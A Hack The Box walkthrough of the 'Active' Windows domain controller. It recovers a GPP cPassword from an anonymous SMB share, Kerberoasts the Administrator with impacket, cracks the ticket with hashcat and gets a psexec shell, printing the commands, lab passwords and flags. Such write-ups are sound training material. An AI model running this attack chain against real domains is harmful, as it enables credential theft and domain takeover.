---
title: "HTB: Active"
description: "A GPP cPassword in an anonymous SMB share gives a service account, which kerberoasts the Administrator for Domain Admin."
categories: [htb]
tags: [windows, active-directory, gpp, kerberoasting, smb]
difficulty: Easy
box:
  OS: Windows Server 2008 R2
  Difficulty: Easy
  Domain: active.htb
  IP: 10.10.10.100
---

## Overview

Active is an easy Windows AD box built around two classic techniques:

- Read the `Replication` SMB share anonymously and recover a **GPP cPassword** (`SVC_TGS`)
- **Kerberoast** the Administrator account with those creds, crack the TGS, and pass-the-hash

**Tools:** nmap · smbclient · gpp-decrypt · impacket (GetUserSPNs, psexec) · hashcat

## Recon

```
nmap -p- -sCV -oN nmapscan 10.10.10.100
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: active.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: active.htb)
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
```

Server 2008 R2, domain `active.htb`, host `DC`. Port 5722 (DFS-R) hints at SYSVOL/Replication.

## Enumeration: anonymous SMB

Listing shares shows a readable `Replication` share:

```
smbclient -L //10.10.10.100/ --no-pass
```

Connect anonymously:

```
smbclient --no-pass //10.10.10.100/Replication
```

This is a copy of SYSVOL. Buried in the Group Policy folders is a `Groups.xml`:

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" ...>
    <Properties action="U" ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

That `cpassword` is a GPP preference password. Microsoft published the AES key used to encrypt these in [MS14-025](https://support.microsoft.com/en-us/topic/ms14-025), so it decrypts offline.

## Foothold: decrypt the GPP cPassword

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
GPPstillStandingStrong2k18
```

Credentials: **`SVC_TGS:GPPstillStandingStrong2k18`**

> Reference: [Finding and decrypting GPP passwords](https://adsecurity.org/?p=2288)

## Privilege escalation: Kerberoasting

With a valid domain account, request service tickets for any SPN-enabled account. `GetUserSPNs` shows the Administrator is kerberoastable:

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.10.10.100 -request -outputfile spn_hash
```

```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  -----------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
```

This writes the Administrator's TGS to `spn_hash` (a long `$krb5tgs$23$` blob, truncated here):

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7533522e2c9b882516068e1f0162e6e8$a51f...
```

Crack it with hashcat (mode 13100 = Kerberos 5 TGS-REP):

```
hashcat -m 13100 spn_hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Cracked password: **`Ticketmaster1968`**

## Domain Admin

The Administrator password works directly over psexec:

```
impacket-psexec "active.htb/Administrator:Ticketmaster1968"@10.10.10.100
```

```
[*] Found writable share ADMIN$
[*] Creating service UANg on 10.10.10.100.....
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32> whoami
active\administrator
```

Both flags:

```
c:\Users\Administrator\Desktop> type root.txt
24aeaf3348e745bf9eef3140fc210b4a

c:\Users\SVC_TGS\Desktop> type user.txt
71b56d17b307df347e07c4b9b68d82b2
```

Domain Admin. 🩸

## References

- [MS14-025: GPP cPassword](https://support.microsoft.com/en-us/topic/ms14-025)
- [Kerberoasting — HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
